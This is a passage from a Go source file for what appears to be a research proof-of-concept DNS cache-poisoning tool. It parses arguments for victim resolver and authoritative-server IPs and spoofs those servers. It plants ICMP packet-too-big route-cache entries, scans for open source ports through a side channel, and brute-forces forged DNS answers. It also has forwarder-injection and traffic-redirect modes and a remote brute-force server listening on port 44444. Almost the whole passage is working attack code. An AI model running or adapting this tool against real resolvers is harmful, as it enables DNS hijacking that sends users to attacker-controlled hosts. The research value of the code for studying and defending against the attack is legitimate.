	mtu, fastMode, dnsTimeout, _, redirectNewGW, redirectOldGW, checkPoint, plantDelay, pcapInputFileName, seedGuessStep, ipListFileName, bruteForceServerSrc, bruteForceServer := parseArgs()
	if seedGuessStep == 3 {
		readMacs()
	}
	h, _, _, eth = initPcap(*ifaceName, CheckIPv6(localIP), gatewayMac, localMac, pcapInputFileName)
	if bruteForceServerSrc != "" {
		listensock, err := net.Listen("tcp", "0.0.0.0:44444")
		if err != nil {
			fmt.Println("listen err:", err)
			os.Exit(-1)
		}
		/* TODO: NAT only valid for one NS' IP */
		serverRoutine(listensock, net.ParseIP(bruteForceServerSrc))
	}
	if bruteForceServer != "" {
		serverTCPAddr, err := net.ResolveTCPAddr("tcp", bruteForceServer)
		if err != nil {
			fmt.Println("client TCP addr err:", err)
			os.Exit(-1)
		}
		conn, err := net.DialTCP("tcp", nil, serverTCPAddr)
		if err != nil {
			fmt.Println("TCP err", err)
			os.Exit(-1)
		}
		bfConn = conn
	}
	go recevingThread()
	/* Multithread is buggy, w/o much performance improvement */
	for i := 0; i < 1; i++ {
		go recevingWorker()
	}
	garbage := make([]byte, mtu-IPICMPHDRLEN+GARBAGE_EXTRA)
	for i := 0; i < int(mtu-IPICMPHDRLEN+GARBAGE_EXTRA); i++ {
		garbage[i] = 1
	}
	if seedGuessStep == 0 {
		guessSeed(checkPoint, victimIP, plantDelay, mtu, garbage, 0)
		return
	} else if seedGuessStep == 1 {
		guessSeed_macVer1(checkPoint, victimIP, plantDelay, mtu)
		return
	} else if seedGuessStep == 2 {
		guessSeed_macver2(checkPoint, victimIP, plantDelay, garbage)
		return
	} else if seedGuessStep == 3 {
		guessSeed_macver_analyze(checkPoint)
		return
	}
	tempCIPs := make([][NS_NUM][BUCKET_DEPTH * 2]net.IP, 0)
	/* Modify here if we use multiple backend resolvers / NS */
	if ipListFileName == "" {
		r := backendResolverBuilder(victimIP, redirectNewGW, redirectOldGW)
		backendResolvers = append(backendResolvers, r)
	} else {
		file, err := os.Open(ipListFileName)
		if err != nil {
			fmt.Println(err)
			os.Exit(-1)
		}
		for {
			var resolverIP string
			n, err := fmt.Fscanf(file, "%s", &resolverIP)
			if n <= 0 || err != nil {
				break
			}
			var temp [NS_NUM][BUCKET_DEPTH * 2]net.IP
			if !*publicPortMode {
				for nNS := 0; nNS < NS_NUM; nNS++ {
					for nCIP := 0; nCIP < BUCKET_DEPTH*2; nCIP++ {
						var tempString string
						n, err := fmt.Fscanf(file, "%s", &tempString)
						temp[nNS][nCIP] = net.ParseIP(tempString)
						if n <= 0 || err != nil {
							fmt.Println("err, not sufficient colliding IPs, nCIP=", nCIP)
							os.Exit(1)
						}
					}
				}
			}
			r := backendResolverBuilder(net.ParseIP(resolverIP), redirectNewGW, redirectOldGW)
			backendResolvers = append(backendResolvers, r)
			fmt.Println("backend:", resolverIP)
			tempCIPs = append(tempCIPs, temp)
		}
	}
	for seq, res := range backendResolvers {
		//if *redirectAttackMode {
		//	go neighborCacheSolicitor(r)
		//}
		time.Sleep(time.Millisecond)
		for i := 0; i < NS_NUM; i++ {
			if ipListFileName == "" {
				res.nameServers = append(res.nameServers, nsBuilder(victimAuthIP[i], collidingIPs[i], collidingIPs2[i], mtu, fastMode))
			} else if !*publicPortMode {
				res.nameServers = append(res.nameServers, nsBuilder(victimAuthIP[i], tempCIPs[seq][i][:BUCKET_DEPTH], tempCIPs[seq][i][BUCKET_DEPTH:], mtu, fastMode))
			} else {
				res.nameServers = append(res.nameServers, nsBuilder(victimAuthIP[i], nil, nil, mtu, fastMode))
			}
		}
		if !*floodOnlyMode {
			if !*publicPortMode {
				for _, ns := range res.nameServers {
					go cachePlanter(res, ns, false, false)
					if len(collidingIPs2) != 0 {
						go cachePlanter(res, ns, false, true)
					}
					go probeSender(res, ns)
					go portGroupFormer(res, ns, *startPort, *endPort)
					if *groupSize == 1 {
						go bruteForcer(res, ns)
					}
				}
			} else {
				go probeSender(res, res.nameServers[0])
				go portGroupFormer(res, res.nameServers[0], *startPort, *endPort)
				for _, ns := range res.nameServers {
					if *groupSize == 1 {
						go bruteForcer(res, ns)
					}
				}
			}
		}
	}
	go recevingThread()
	/* Multithread is buggy, w/o much performance improvement */
	for i := 0; i < 1; i++ {
		go recevingWorker()
	}
	go dnsRequestSender(dnsTimeout, localIP)
	attackStartTime = time.Now()
	fmt.Println("Start attack @", attackStartTime)
	time.Sleep(999 * time.Hour)
}

/* Utility functions below this point */

func calculatePortDistance(port0 uint16, port1 uint16) uint16 {
	distance := port0 - port1
	if distance > 32767 {
		return 65535 - distance
	} else {
		return distance
	}
}

func initPcap(ifaceName string, v6 bool, nextHopMac net.HardwareAddr, localMac net.HardwareAddr, pcapInputFileName string) (*pcap.Handle, *net.Interface, net.IP, *layers.Ethernet) {
	handle, err := pcap.OpenLive(
		ifaceName,
		65536,
		true,
		pcap.BlockForever,
	)
	if pcapInputFileName != "" {
		handle, err = pcap.OpenOffline(pcapInputFileName)
		// TODO: here we assumes this is only used in seed guessing
		guessSeedMacMode = true
		guessSeedMode = true
	}
	if err != nil {
		fmt.Println("handle open err:", err)
		os.Exit(1)
	}
	if nextHopMac == nil && localMac == nil {
		iface, err := net.InterfaceByName(ifaceName)
		if err != nil {
			fmt.Println("interface open err:", err)
			os.Exit(2)
		}
		localIPArray, err := GetIfaceAddrMulti(iface)
		if err != nil {
			fmt.Println("ip get err:", err)
			os.Exit(3)
		}
		localIP := localIPArray[0]
		//query routing table
		router, err := routing.New()
		if err != nil {
			fmt.Println("route table build err:", err)
			os.Exit(4)
		}
		//TODO: here we assume only one default route
		var nextHopIP net.IP
		if !v6 {
			_, nextHopIP, _, err = router.Route(net.ParseIP("8.8.8.8"))
		} else {
			_, nextHopIP, _, err = router.Route(net.ParseIP("2001:4860:4860::8888"))
		}
		if err != nil {
			fmt.Println("route table query err:", err)
			os.Exit(5)
		}
		var dstMac net.HardwareAddr
		if v6 {
			dstMac, err = GetGatewayAddr(iface, handle, nextHopIP)
		} else {
			dstMac, err = GetGatewayAddr(iface, handle, nextHopIP.To4())
		}
		if err != nil {
			fmt.Println("ARP for gateway MAC err:", err)
			os.Exit(6)
		}
		//fmt.Println("MAC:", dstMac)
		ethernetLayer := &layers.Ethernet{
			SrcMAC:       iface.HardwareAddr,
			DstMAC:       dstMac,
			EthernetType: layers.EthernetTypeIPv4,
		}
		if v6 {
			ethernetLayer.EthernetType = layers.EthernetTypeIPv6
		}
		return handle, iface, localIP, ethernetLayer
	} else {
		ethernetLayer := &layers.Ethernet{
			SrcMAC:       localMac,
			DstMAC:       nextHopMac,
			EthernetType: layers.EthernetTypeIPv4,
		}
		if v6 {
			ethernetLayer.EthernetType = layers.EthernetTypeIPv6
		}
		return handle, nil, nil, ethernetLayer
	}
}

func parseArgs() (uint16, bool, uint, uint, net.IP, net.IP, int, uint, string, int, string, string, string) {
	/* Basic Args */
	ifaceName = flag.String("i", "", "interface name")
	localIPv6AddressArg := flag.String("a", "", "local IPv6 address with prefixlen")
	victimIPArg := flag.String("t", "", "victim resolver IP")
	victimBackIPListArg := flag.String("bt", "", "victim resolver backend ip list filename")
	victimFrontIPArg := flag.String("ft", "", "victim resolver front IP")
	victimDomain = flag.String("d", "", "victim domain name")
	auxDomain = flag.String("ad", "", "aux domain name")
	gatewayMacArg := flag.String("g", "", "gateway mac")     /* If in the same subnet, this should be the victim MAC address. */
	interfaceMacArg := flag.String("m", "", "interface mac") /* Local sending MAC. */
	serverMode := flag.String("l", "", "run in BF server mode, Port 44444. arg=src IP to send packet")
	serverAddr := flag.String("s", "", "BF server IP and Port if any")
	remoteBF = flag.Bool("rbf", false, "run bruteforce remotely")
	remoteQuery = flag.Bool("rqr", false, "run query remotely")
	floodOnlyMode = flag.Bool("fo", false, "(Test Only)only flooding, in-path")
	testMode = flag.Bool("test", false, "test mode: assume we are on path and check the vulnerability")
	enableBF = flag.Bool("bf", true, "enable BF, set to false while testing")
	victimAuthIPArg := make([]*string, 0)
	for i := 0; i < NS_NUM; i++ {
		victimAuthIPArg = append(victimAuthIPArg, flag.String("v"+strconv.Itoa(i), "", "ip of the victim auth server"+strconv.Itoa(i)+", used for spoofing"))
	}
	dnsPrivacyMode = flag.Bool("p", false, "if the query is sent like _.xxx.com, please say true, otherwise say false")
	publicPortMode = flag.Bool("pub", true, "true if we are attacking public facing ports")
	forwarderInjectMode = flag.Bool("f", false, "true if attacking forwarders (using CNAME injection)")
	/* TODO: BUG currently support private facing Port only*/
	redirectAttackMode = flag.Bool("r", false, "redirect attack mode")
	redirectNewGWArg := flag.String("ngw", "", "the address where we want to redirect traffic to")
	redirectOldGWArg := flag.String("ogw", "", "the address of the original gw")
	threadsForPktProcess := flag.Uint("j", 24, "thread used for processing packets")
	collidingIPArgs := make([][]*string, 0)
	for i := 0; i < NS_NUM; i++ {
		collidingIPArgs = append(collidingIPArgs, make([]*string, 0))
		for j := 0; j < BUCKET_DEPTH; j++ {
			collidingIPArgs[i] = append(collidingIPArgs[i], flag.String("c"+strconv.Itoa(i)+strconv.Itoa(j), "", "colliding IP"+strconv.Itoa(j)+"for NS"+strconv.Itoa(i)))
		}
	}
	collidingIPArgs2 := make([][]*string, 0)
	for i := 0; i < NS_NUM; i++ {
		collidingIPArgs2 = append(collidingIPArgs2, make([]*string, 0))
		for j := BUCKET_DEPTH; j < BUCKET_DEPTH*2; j++ {
			collidingIPArgs2[i] = append(collidingIPArgs2[i], flag.String("c"+strconv.Itoa(i)+strconv.Itoa(j), "", "colliding IP"+strconv.Itoa(j)+" for NS"+strconv.Itoa(i)+", used for enhanced cache refreshing"))
		}
	}
	/* Tuning Args */
	groupSize = flag.Int("S", 1, "the size of probing batch")
	// Note: verification shouldn't reordered into the next batch, otherwise the result may be inaccurate.
	startPort = flag.Uint("SP", 33000, "beginning Port of the scanning range")
	endPort = flag.Uint("EP", 34000, "ending Port of the scanning range")
	dnsTimeout := flag.Uint("T", 10000, "retry interval for sending queries, in ms")
	bsStateDuration = flag.Uint("B", 500, "duration of BS state, in ms, reduce this if we scan so fast and using group size = 1")
	groupGap = flag.Uint("G", 1, "gap between each batch send, in us")
	packetSendingGap = flag.Uint("SG", 0, "gap between probing packets, in us")
	verificationGap = flag.Uint("VG", 1, "gap between the last probing packet and the verification, in us")
	dnsBFTimeGap = flag.Uint("DG", 0, "gap between the dns brute forcing packets, in ns")
	dnsBFFinishTimeGap = flag.Uint("FG", 1000, "gap after the dns brute force finish, in us")
	plantingGap = flag.Uint("PG", 0, "gap between the planting packets, in us")
	plantingFinishGap = flag.Uint("PFG", 10000, "gap after planting packets, in us")
	fastPlantMode := flag.Bool("F", false, "use alternative order to plant, by default, 1 jiffies is required between each planting packet")
	mtu := flag.Uint("M", 1490, "mtu used in pkt2big")
	enhancedRefreshPercentage = flag.Uint("E", 20, "chances for using enhanced refreshing, must be 0-100, additional colliding IP req'd")
	jitterProtectionDuration = flag.Uint("J", 60, "jitter protection interval in ms, now only available when group size = 1")
	useLocalIP = flag.Bool("L", true, "use local src IP for the outer layer")
	/*Seed guessing args*/
	sendSize := flag.Int("ss", 1024, "the size of the batch")
	plantDelay := flag.Uint("pd", 0, "delay between each planting packet")
	pcapInputFile := flag.String("pcap", "", "pcap file name for analysis")
	seedGuessStep := flag.Int("gs", -1, "which step are we doing")
	flag.Parse()
	localIP, localIPv6Subnet, _ = net.ParseCIDR(*localIPv6AddressArg)
	victimIP = net.ParseIP(*victimIPArg)
	victimFrontIP = net.ParseIP(*victimFrontIPArg)
	gatewayMac, _ = net.ParseMAC(*gatewayMacArg)
	localMac, _ = net.ParseMAC(*interfaceMacArg)
	redirectNewGW := net.ParseIP(*redirectNewGWArg)
	redirectOldGW := net.ParseIP(*redirectOldGWArg)
	for i := 0; i < NS_NUM; i++ {
		victimAuthIP = append(victimAuthIP, net.ParseIP(*victimAuthIPArg[i]))
	}
	for i := 0; i < NS_NUM; i++ {
		collidingIPs = append(collidingIPs, make([]net.IP, 0))
		for j := 0; j < BUCKET_DEPTH; j++ {
			collidingIPs[i] = append(collidingIPs[i], net.ParseIP(*collidingIPArgs[i][j]))
		}
	}
	for i := 0; i < NS_NUM; i++ {
		collidingIPs2 = append(collidingIPs2, make([]net.IP, 0))
		for j := 0; j < BUCKET_DEPTH; j++ {
			collidingIPs2[i] = append(collidingIPs2[i], net.ParseIP(*collidingIPArgs2[i][j]))
		}
	}

	return uint16(*mtu), *fastPlantMode, *dnsTimeout, *threadsForPktProcess, redirectNewGW, redirectOldGW, *sendSize, *plantDelay, *pcapInputFile, *seedGuessStep, *victimBackIPListArg, *serverMode, *serverAddr
}

func portGroupFormer(r *BackendResolver, n *NameServer, startPort uint, endPort uint) {
	if !*testMode {
		for {
			//divide into groups
			var id uint16 = 0
			var currentGroupSize uint = 0
			for i := startPort; i <= endPort; i++ {
				//TODO: Disabled for Google's scan, too many FPs, re-enabled now
				if r.alwaysOpenPorts[i] {
					continue
				}
				if currentGroupSize%uint(*groupSize) == 0 {
					if id != 0 {
						n.probeChannel <- id
						for j := 1; j < repeatTimes; j++ {
							//dup
							previd := id
							id = allocateGroupID(n)
							n.groups[id] = make([]uint16, len(n.groups[previd]))
							copy(n.groups[id], n.groups[previd])
							n.probeChannel <- id
						}
					}
					id = allocateGroupID(n)
					n.groups[id] = make([]uint16, 0)
				}
				n.groups[id] = append(n.groups[id], uint16(i))
				currentGroupSize++
			}

			//deal with last several cases
			if /*len(r.groups[id]) != 50 &&*/ len(n.groups[id]) != 0 {
				//for len(r.groups[id]) != int(GROUP_SIZE) && len(r.groups[id]) != 0 {
				//	r.groups[id] = append(r.groups[id], 65535)
				//}
				n.probeChannel <- id
				for j := 1; j < repeatTimes; j++ {
					//dup
					previd := id
					id = allocateGroupID(n)
					n.groups[id] = make([]uint16, len(n.groups[previd]))
					copy(n.groups[id], n.groups[previd])
					n.probeChannel <- id
				}
			}
		}
		//if testMode {
		//	break
		//}
	}
}

func backendResolverBuilder(backendIP net.IP, redirectNewGW net.IP, redirectOldGW net.IP) *BackendResolver {
	if backendIP == nil {
		return nil
	}
	temp := BackendResolver{
		resolverBackendIP: backendIP,
		alwaysOpenPorts:   make([]bool, 65536),
		networkXmitLock:   &sync.Mutex{},
		nameServers:       make([]*NameServer, 0),
		redirectNewGW:     redirectNewGW,
		redirectOldGW:     redirectOldGW,
	}
	for i := 0; i < 65536; i++ {
		temp.alwaysOpenPorts[i] = false
	}
	//temp.alwaysOpenPorts[53] = true
	temp.alwaysOpenPorts[0] = true
	temp.alwaysOpenPorts[65535] = true
	return &temp
}

func nsBuilder(nameserver net.IP, cIPs []net.IP, cIPs2 []net.IP, mtu uint16, fastMode bool) *NameServer {
	if nameserver == nil {
		return nil
	}
	temp := &NameServer{
		nsIP:                      nameserver,
		collidingIPs:              cIPs,
		collidingIPs2:             cIPs2,
		mtu:                       mtu,
		garbage:                   make([]byte, mtu-IPICMPHDRLEN+GARBAGE_EXTRA),
		groups:                    make([][]uint16, 65536),
		groupIDCounter:            3,
		groupIDCounterLock:        &sync.Mutex{},
		groupSendTime:             make([]time.Time, 65536),
		probeChannel:              make(chan uint16, 2),
		priorityProbeChannel:      make(chan uint16, 65536),
		priorityProbeGroupNum:     make([]uint16, 65536),
		priorityProbeGroupNumLock: &sync.Mutex{},
		bruteForceBuffer:          make(chan uint16, 65536),
		receivedPortidChannel:     make(chan uint16, 65536),
	}
	for i := 0; i < int(mtu-IPICMPHDRLEN+GARBAGE_EXTRA); i++ {
		temp.garbage[i] = 1
	}
	temp.fastPlantMode = fastMode
	return temp
}

func allocateGroupID(n *NameServer) uint16 {
	n.groupIDCounterLock.Lock()
	id := n.groupIDCounter
	n.groupIDCounter++
	if n.groupIDCounter == 0 {
		n.groupIDCounter = 4
	}
	n.groupIDCounterLock.Unlock()
	return id
}

func getBackendResolver(resolverIP net.IP) *BackendResolver {
	for _, r := range backendResolvers {
		if CompareIPAddr(r.resolverBackendIP, resolverIP, 0) == 0 {
			return r
		}
	}
	return nil
}

func getNS(collisionIP net.IP, r *BackendResolver) *NameServer {

	for _, n := range r.nameServers {
		for _, cIP := range n.collidingIPs {
			if CompareIPAddr(cIP, collisionIP, 0) == 0 {
				return n
			}
		}
	}
	return nil
}
